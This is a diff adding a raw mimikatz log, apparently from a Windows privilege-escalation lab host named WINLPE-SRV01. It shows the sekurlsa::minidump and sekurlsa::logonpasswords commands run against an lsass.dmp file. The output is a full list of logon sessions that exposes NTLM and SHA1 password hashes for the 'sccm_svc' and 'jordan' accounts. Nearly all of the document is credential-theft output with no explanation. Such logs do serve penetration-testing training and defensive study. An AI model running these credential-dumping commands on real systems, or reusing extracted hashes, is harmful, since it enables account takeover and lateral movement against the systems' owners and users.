@@ -1,0 +1,353 @@
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::minidump lsass.dmp
+Switch to MINIDUMP : 'lsass.dmp'
+
+mimikatz # sekurlsa::logonpasswords
+Opening : 'lsass.dmp' file for minidump...
+
+Authentication Id : 0 ; 2859232 (00000000:002ba0e0)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/26/2025 3:10:23 AM
+SID               : S-1-5-90-0-2
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WINLPE-SRV01$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 303604 (00000000:0004a1f4)
+Session           : Interactive from 1
+User Name         : sccm_svc
+Domain            : WINLPE-SRV01
+Logon Server      : WINLPE-SRV01
+Logon Time        : 7/26/2025 2:48:18 AM
+SID               : S-1-5-21-3769161915-3336846931-3985975925-1012
+	msv :	
+	 [00000006] Primary
+	 * Username : sccm_svc
+	 * Domain   : WINLPE-SRV01
+	 * NTLM     : 64f12cddaa88057e06a81b54e73b949b
+	 * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
+	tspkg :	
+	wdigest :	
+	 * Username : sccm_svc
+	 * Domain   : WINLPE-SRV01
+	 * Password : (null)
+	kerberos :	
+	 * Username : sccm_svc
+	 * Domain   : WINLPE-SRV01
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 7/26/2025 2:47:54 AM
+SID               : S-1-5-17
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 116198 (00000000:0001c5e6)
+Session           : Service from 0
+User Name         : MSSQL$SQLEXPRESS
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 7/26/2025 2:47:53 AM
+SID               : S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WINLPE-SRV01$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : MSSQL$SQLEXPRESS
+	 * Domain   : NT Service
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 73307 (00000000:00011e5b)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/26/2025 2:47:51 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WINLPE-SRV01$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 40355 (00000000:00009da3)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 7/26/2025 2:47:50 AM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 3106191 (00000000:002f658f)
+Session           : Interactive from 2
+User Name         : jordan
+Domain            : WINLPE-SRV01
+Logon Server      : WINLPE-SRV01
+Logon Time        : 7/26/2025 3:11:58 AM
+SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
+	msv :	
+	 [00000006] Primary
+	 * Username : jordan
+	 * Domain   : WINLPE-SRV01
+	 * NTLM     : 30689ae6de22596f45afb9619f8e5fa0
+	 * SHA1     : 369b6cc895433f5534f0a23b3025266ab515a581
+	tspkg :	
+	wdigest :	
+	 * Username : jordan
+	 * Domain   : WINLPE-SRV01
+	 * Password : (null)
+	kerberos :	
+	 * Username : jordan
+	 * Domain   : WINLPE-SRV01
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 2881200 (00000000:002bf6b0)
+Session           : RemoteInteractive from 2
+User Name         : jordan
+Domain            : WINLPE-SRV01
+Logon Server      : WINLPE-SRV01
+Logon Time        : 7/26/2025 3:10:24 AM
+SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
+	msv :	
+	 [00000006] Primary
+	 * Username : jordan
+	 * Domain   : WINLPE-SRV01
+	 * NTLM     : 30689ae6de22596f45afb9619f8e5fa0
+	 * SHA1     : 369b6cc895433f5534f0a23b3025266ab515a581
+	tspkg :	
+	wdigest :	
+	 * Username : jordan
+	 * Domain   : WINLPE-SRV01
+	 * Password : (null)
+	kerberos :	
+	 * Username : jordan
+	 * Domain   : WINLPE-SRV01
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 2881170 (00000000:002bf692)
+Session           : RemoteInteractive from 2
+User Name         : jordan
+Domain            : WINLPE-SRV01
+Logon Server      : WINLPE-SRV01
+Logon Time        : 7/26/2025 3:10:24 AM
+SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
+	msv :	
+	 [00000006] Primary
+	 * Username : jordan
+	 * Domain   : WINLPE-SRV01
+	 * NTLM     : 30689ae6de22596f45afb9619f8e5fa0
+	 * SHA1     : 369b6cc895433f5534f0a23b3025266ab515a581
+	tspkg :	
+	wdigest :	
+	 * Username : jordan
+	 * Domain   : WINLPE-SRV01
+	 * Password : (null)
+	kerberos :	
+	 * Username : jordan
+	 * Domain   : WINLPE-SRV01
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 2859204 (00000000:002ba0c4)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/26/2025 3:10:23 AM
+SID               : S-1-5-90-0-2
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WINLPE-SRV01$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 303273 (00000000:0004a0a9)
+Session           : Interactive from 1
+User Name         : sccm_svc
+Domain            : WINLPE-SRV01
+Logon Server      : WINLPE-SRV01
+Logon Time        : 7/26/2025 2:48:18 AM
+SID               : S-1-5-21-3769161915-3336846931-3985975925-1012
+	msv :	
+	 [00000006] Primary
+	 * Username : sccm_svc
+	 * Domain   : WINLPE-SRV01
+	 * NTLM     : 64f12cddaa88057e06a81b54e73b949b
+	 * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
+	tspkg :	
+	wdigest :	
+	 * Username : sccm_svc
+	 * Domain   : WINLPE-SRV01
+	 * Password : (null)
+	kerberos :	
+	 * Username : sccm_svc
+	 * Domain   : WINLPE-SRV01
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WINLPE-SRV01$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/26/2025 2:47:51 AM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WINLPE-SRV01$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : winlpe-srv01$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 73351 (00000000:00011e87)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/26/2025 2:47:51 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WINLPE-SRV01$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 7/26/2025 2:47:51 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 117600 (00000000:0001cb60)
+Session           : Service from 0
+User Name         : SQLTELEMETRY$SQLEXPRESS01
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 7/26/2025 2:47:53 AM
+SID               : S-1-5-80-3404462892-1987791245-2451609587-3755554482-3689831200
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WINLPE-SRV01$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : SQLTELEMETRY$SQLEXPRESS01
+	 * Domain   : NT Service
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 116130 (00000000:0001c5a2)
+Session           : Service from 0
+User Name         : MSSQL$SQLEXPRESS01
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 7/26/2025 2:47:53 AM
+SID               : S-1-5-80-684135558-66954648-645343295-865517114-2956913369
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WINLPE-SRV01$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : MSSQL$SQLEXPRESS01
+	 * Domain   : NT Service
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WINLPE-SRV01$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/26/2025 2:47:50 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WINLPE-SRV01$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : winlpe-srv01$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+mimikatz # 
